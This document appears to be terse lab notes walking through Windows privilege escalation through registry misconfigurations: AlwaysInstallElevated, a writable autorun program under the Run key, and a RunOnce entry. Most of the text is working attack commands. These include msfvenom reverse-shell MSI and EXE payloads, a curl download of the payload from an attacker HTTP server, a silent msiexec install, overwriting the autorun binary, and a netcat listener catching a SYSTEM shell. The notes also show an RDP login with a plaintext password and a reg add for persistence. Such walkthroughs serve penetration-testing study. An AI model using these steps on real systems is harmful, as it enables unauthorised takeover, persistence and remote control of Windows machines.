# Windows Privilege Escalation via Registry | Real-World Exploit Walkthrough

# Registry No 1

```jsx
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

```

![image.png](Windows%20Privilege%20Escalation%20via%20Registry%20Real-Wor/image.png)

![image.png](Windows%20Privilege%20Escalation%20via%20Registry%20Real-Wor/image%201.png)

Both need the same configuration

```jsx
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

```

MSI   payload = msfvenom

```jsx
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f msi >shell.msi
```

Start Server

```jsx
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80  
```

Get file to Windows PC

```jsx
C:\Users\user\Desktop>curl http://192.168.128.41/shell.msi -o shell.msi
```

Install msi  →>  take shell

```jsx
msiexec /quiet /qn /i shell.msi
```

![image.png](Windows%20Privilege%20Escalation%20via%20Registry%20Real-Wor/image%202.png)

```jsx
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.128.41] from (UNKNOWN) [10.145.176.232] 49930
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```

# Registry No 2

```jsx
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

```

```jsx
cd C:\Program files\Autorun Program
```

![image.png](Windows%20Privilege%20Escalation%20via%20Registry%20Real-Wor/image%203.png)

Checking write or folder access  permission

```jsx
ecgo > program.exe
echo > test.txt
```

# curl can modify access-denied folder files

## Now, make another exe payload

```jsx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe > shell.exe

```

```jsx
curl http://192.168.0.2/shell.exe -o program.exe
```

![image.png](Windows%20Privilege%20Escalation%20via%20Registry%20Real-Wor/image%204.png)

Netcat

```jsx
nc -lvnp 4444
```

admin log in with rdp

```jsx
xfreerdp /u:admin /p:password123 /cert:ignore /v:10.145.176.232
```

# Registry No 3

```jsx
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

```

```jsx
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v shell /t REG_SZ /d "C:\Program files\Autorun Program" /f 

```